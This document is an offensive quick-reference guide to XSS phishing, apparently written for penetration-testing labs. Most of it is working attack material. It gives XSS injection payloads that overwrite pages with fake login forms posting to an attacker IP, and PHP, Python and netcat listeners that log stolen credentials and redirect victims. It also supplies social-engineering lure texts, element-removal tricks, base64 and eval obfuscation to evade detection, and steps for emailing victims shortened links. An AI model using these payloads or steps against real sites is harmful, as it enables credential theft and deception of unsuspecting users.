# XSS Phishing Quick Reference

## What is XSS Phishing?

**XSS Phishing** = Inject fake login form via XSS to steal credentials

**Attack Flow**:
```
Find XSS → Inject fake form → Victim enters creds → Steal credentials
```

## Step-by-Step Attack

### Step 1: Find XSS Vulnerability

```bash
# Test basic payload
<script>alert(1)</script>

# Try alternatives if blocked
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

# Check page source to see how input is handled
View Page Source (CTRL+U)
```

### Step 2: Create Fake Login Form

#### Basic HTML Login Form
```html
<h3>Please login to continue</h3>
<form action=http://YOUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

#### Get Your IP
```bash
# Find your IP
ip a | grep tun0
# Or
ifconfig tun0
# Use this IP in the form action
```

### Step 3: Inject Form with JavaScript

#### Minified JavaScript Payload
```javascript
document.write('<h3>Please login to continue</h3><form action=http://YOUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

#### Full XSS Payload (example)
```html
<script>document.write('<h3>Please login to continue</h3><form action=http://10.10.14.5><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');</script>
```

### Step 4: Remove Original Form (Clean Up)

#### Find Form ID
```bash
# Open Page Inspector (CTRL+SHIFT+C)
# Click on form element
# Note the ID (e.g., "urlform")
```

#### Remove Element by ID
```javascript
document.getElementById('urlform').remove();
```

#### Comment Out Remaining HTML
```html
...PAYLOAD... <!--
```

### Step 5: Complete Payload

```javascript
document.write('<h3>Please login to continue</h3><form action=http://YOUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();<!--
```

### Step 6: Setup Credential Listener

#### Method 1: Netcat (Simple)
```bash
# Listen on port 80
sudo nc -lvnp 80

# Wait for credentials
# Output: GET /?username=admin&password=pass123
```

#### Method 2: PHP Server (Better)

##### Create index.php
```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://ORIGINAL_SITE/page.php");
    fclose($file);
    exit();
}
?>
```

##### Start PHP Server
```bash
# Create directory
mkdir /tmp/tmpserver
cd /tmp/tmpserver

# Create index.php file
nano index.php
# Paste PHP code above

# Start server
sudo php -S 0.0.0.0:80

# Check captured creds
cat creds.txt
```

## Full Attack Example

### 1. Setup Listener
```bash
# Terminal 1
mkdir /tmp/phish
cd /tmp/phish
nano index.php  # Paste PHP code

sudo php -S 0.0.0.0:80
```

### 2. Craft Payload
```javascript
<script>
document.write('<h3>Session Expired - Please login</h3><form action=http://10.10.14.5><input type="text" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" value="Login"></form>');
document.getElementById('urlform').remove();
</script><!--
```

### 3. Inject via XSS
```
http://target.com/page?param=<script>document.write('<h3>Please login</h3><form action=http://YOUR_IP>...</form>');</script>
```

### 4. Send to Victim
```
Shorten URL with bit.ly
Email victim the link
Wait for credentials in creds.txt
```

## PHP Credential Logger

### Basic Version
```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://TARGET_SITE");
    fclose($file);
    exit();
}
?>
```

### Enhanced Version (with timestamp)
```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    $timestamp = date("Y-m-d H:i:s");
    fputs($file, "[$timestamp] Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://TARGET_SITE");
    fclose($file);
    exit();
}
?>
```

## Common Payloads

### Basic Login Form
```javascript
document.write('<h3>Please login to continue</h3><form action=http://YOUR_IP><input type="text" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" value="Login"></form>');
```

### Session Expired
```javascript
document.write('<h3>Session Expired</h3><p>Please re-enter your credentials</p><form action=http://YOUR_IP><input type="text" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" value="Login"></form>');
```

### Security Update
```javascript
document.write('<h3>Security Update Required</h3><p>Please verify your account</p><form action=http://YOUR_IP><input type="text" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" value="Verify"></form>');
```

## Social Engineering Messages

```javascript
// Session timeout
'<h3>Your session has expired</h3><p>Please login again</p>'

// Security check
'<h3>Security Verification</h3><p>Please confirm your identity</p>'

// Premium feature
'<h3>Unlock Premium Features</h3><p>Login to continue</p>'

// Error message
'<h3>Authentication Error</h3><p>Please re-enter credentials</p>'
```

## Cleanup Techniques

### Remove Original Form
```javascript
document.getElementById('FORM_ID').remove();
```

### Comment Out Remaining HTML
```html
...PAYLOAD...<!--
```

### Hide Elements with CSS
```javascript
document.write('<style>#urlform{display:none}</style>');
```

### Remove Multiple Elements
```javascript
document.getElementById('form1').remove();
document.getElementById('form2').remove();
document.getElementById('banner').remove();
```

## Listener Options

### Netcat
```bash
sudo nc -lvnp 80
```

### Python HTTP Server
```python
from http.server import BaseHTTPRequestHandler, HTTPServer

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        with open("creds.txt", "a") as f:
            f.write(self.path + "\n")
        self.send_response(302)
        self.send_header('Location', 'http://TARGET_SITE')
        self.end_headers()

HTTPServer(('', 80), Handler).serve_forever()
```

### PHP (Recommended)
```bash
sudo php -S 0.0.0.0:80
```

## Testing Checklist

✅ **Before Attack**:
- [ ] Find working XSS payload
- [ ] Create fake login form
- [ ] Get your IP address
- [ ] Setup credential listener
- [ ] Test payload locally
- [ ] Remove original elements
- [ ] Test redirect works

## Real-World Example

```bash
# 1. Find XSS
http://site.com/page?url=<script>alert(1)</script>

# 2. Get your IP
ip a | grep tun0
# Result: 10.10.14.5

# 3. Create payload
<script>
document.write('<h3>Session Expired</h3><form action=http://10.10.14.5><input type="text" name="user" placeholder="Username"><input type="password" name="pass" placeholder="Password"><input type="submit" value="Login"></form>');
document.getElementById('urlform').remove();
</script><!--

# 4. Start listener
mkdir /tmp/phish && cd /tmp/phish
echo '<?php if(isset($_GET["user"])){file_put_contents("c.txt",$_GET["user"].":".$_GET["pass"]."\n",FILE_APPEND);header("Location: http://site.com");exit();}?>' > index.php
sudo php -S 0.0.0.0:80

# 5. Send malicious URL to victim
http://site.com/page?url=<script>...</script>

# 6. Wait and check
cat c.txt
```

## URL Shortening

```bash
# Hide long XSS URL
Original: http://site.com/page?url=<script>document.write...

# Shorten with:
- bit.ly
- tinyurl.com
- is.gd

Result: https://bit.ly/abc123
```

## Detection Evasion

### Obfuscate JavaScript
```javascript
// Original
document.write('form')

// Base64 encoded
eval(atob('ZG9jdW1lbnQud3JpdGUoJ2Zvcm0nKQ=='))

// Character codes
document.write(String.fromCharCode(102,111,114,109))
```

### Multiple Encoding
```javascript
// URL encode → Base64 → Execute
eval(atob(decodeURIComponent('%64%6F%63...')))
```

## Captured Credentials Format

```bash
# creds.txt output
Username: admin | Password: P@ssw0rd123
Username: john | Password: welcome1
Username: sarah | Password: letmein

# With timestamps
[2024-12-29 18:30:45] Username: admin | Password: P@ssw0rd123
[2024-12-29 18:31:12] Username: john | Password: welcome1
```

## Key Points

🔴 **Remember**:
- Always test payload before sending
- Use legitimate-looking messages
- Redirect after credential capture
- Use PHP server (not netcat) for stealth
- Shorten URLs to hide payload

🎯 **Attack Success Factors**:
1. Convincing message
2. Clean injection (no artifacts)
3. Proper redirect
4. Legitimate-looking form
5. Social engineering

## Quick Commands

```bash
# Get IP
ip a | grep tun0

# Start listener
sudo php -S 0.0.0.0:80

# Check captured creds
cat creds.txt

# Tail in real-time
tail -f creds.txt
```
